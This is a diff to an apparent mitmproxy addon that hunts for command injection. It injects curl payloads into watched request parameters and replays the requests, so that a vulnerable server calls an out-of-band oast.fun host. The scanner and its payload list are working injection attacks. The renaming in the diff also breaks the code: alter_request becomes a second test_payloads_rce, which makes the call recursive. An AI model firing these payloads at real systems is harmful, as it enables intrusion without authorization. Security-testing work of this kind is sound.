@@ -12,7 +12,7 @@ class RCE2:
         os.makedirs(self.flow_dir, exist_ok=True)
         self.random_number = None
 
-        self.payload_template = [
+        self.payload_template_rce = [
     "curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
     ",curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
     ";curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
@@ -89,20 +89,20 @@ class RCE2:
     "a);curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun"
 ]
 
-        self.altered_header = "x-altered"
-        self.host_found = None
-        self.watched_parameters = ["pwd","daemon", "upload", "dir", "download", "log", "ip", "cli", "cmd", "exec", "command", "execute", "ping", "query", "jump", "code", "reg", "do", "func", "arg", "option", "load", "process", "step", "read", "function", "req", "feature", "exe", "module", "payload", "run", "print"]
+        self.altered_flow_rce = "x-altered-rce"
+        self.host_found_rce = None
+        self.watched_parameters_rce = ["pwd","daemon", "upload", "dir", "download", "log", "ip", "cli", "cmd", "exec", "command", "execute", "ping", "query", "jump", "code", "reg", "do", "func", "arg", "option", "load", "process", "step", "read", "function", "req", "feature", "exe", "module", "payload", "run", "print"]
         
         
 
     def response(self, flow: http.HTTPFlow) -> None:
-        self.host_found = False
+        self.host_found_rce = False
         
-        if self.altered_header in flow.request.headers:
-            self.check_vulnerability(flow)
+        if self.altered_flow_rce in flow.request.headers:
+            self.check_vulnerability_rce(flow)
             return
 
-        if self.host_found:
+        if self.host_found_rce:
                     return
 
         if flow.request.method in ["GET", "POST"]:
@@ -125,52 +125,52 @@ class RCE2:
                     ctx.log.info("JSON decode error")
                     params = {}
 
-        for watched_param in self.watched_parameters:
+        for watched_param in self.watched_parameters_rce:
             if watched_param in params:
                 value = params[watched_param][0] if isinstance(params[watched_param], list) else params[watched_param]
-                self.test_payloads(flow, watched_param, value)
+                self.test_payloads_rce(flow, watched_param, value)
 
-    def test_payloads(self, original_flow, param, original_value):
+    def test_payloads_rce(self, original_flow, param, original_value):
         self.random_number = str(random.randint(1000, 9999))
-        for template in self.payload_template:
-            if self.host_found:
+        for template in self.payload_template_rce:
+            if self.host_found_rce:
                 break  # Stop if a vulnerability has already been found
 
-            altered_value = template.format(host=original_flow.request.host, random_number=self.random_number)
-            altered_flow = self.alter_request(original_flow, param, altered_value)
+            altered_value_rce = template.format(host=original_flow.request.host, random_number=self.random_number)
+            altered_flow_rce = self.test_payloads_rce(original_flow, param, altered_value_rce)
 
-            if altered_flow:
-                if self.host_found:
+            if altered_flow_rce:
+                if self.host_found_rce:
                     return
                  
-                ctx.master.commands.call("replay.client", [altered_flow])
-                # The response handling is now managed by the check_vulnerability method
+                ctx.master.commands.call("replay.client", [altered_flow_rce])
+                # The response handling is now managed by the check_vulnerability_rce method
 
-    def alter_request(self, original_flow, param, altered_value):
+    def test_payloads_rce(self, original_flow, param, altered_value_rce):
         new_request = copy.deepcopy(original_flow.request)
         if original_flow.request.method == "GET":
-            new_request.query[param] = altered_value
+            new_request.query[param] = altered_value_rce
         else:
             content_type = new_request.headers.get("Content-Type", "")
             if "application/x-www-form-urlencoded" in content_type:
                 params = urllib.parse.parse_qs(new_request.get_text())
-                params[param] = [altered_value]
+                params[param] = [altered_value_rce]
                 new_request.text = urllib.parse.urlencode(params, doseq=True)
             elif "application/json" in content_type:
                 try:
                     body = json.loads(new_request.get_text())
                     if param in body and isinstance(body[param], str):
-                        body[param] = altered_value
+                        body[param] = altered_value_rce
                         new_request.text = json.dumps(body)
                 except json.JSONDecodeError:
                     pass
-        new_request.headers[self.altered_header] = "true"
+        new_request.headers[self.altered_flow_rce] = "true"
 
-        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
-        altered_flow.request = new_request
-        return altered_flow
+        altered_flow_rce = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
+        altered_flow_rce.request = new_request
+        return altered_flow_rce
 
-    def check_vulnerability(self, flow):
+    def check_vulnerability_rce(self, flow):
 
         host_with_random = f"{flow.request.host}.{self.random_number}"
         
@@ -180,15 +180,15 @@ class RCE2:
             with open('file.txt', 'r') as file:
                 file_content = file.read()
 
-            if host_with_random in file_content and not self.host_found:
-                self.host_found = True
+            if host_with_random in file_content and not self.host_found_rce:
+                self.host_found_rce = True
                 self.save_flow(flow)
                 ctx.log.info(f"External resource indicates potential RCE for host: {flow.request.host}")
         except IOError as e:
             ctx.log.error(f"Error reading file: {e}")
 
     def save_flow(self, flow):
-        identifier = f"{flow.request.method}_{flow.request.host}_{flow.request.path}".replace("/", "_")
+        identifier = f"RCE_{flow.request.method}_{flow.request.host}_{flow.request.path}".replace("/", "_")
         filename = os.path.join(self.flow_dir, f"{identifier}.mitm")
         try:
             with open(filename, "wb") as file:
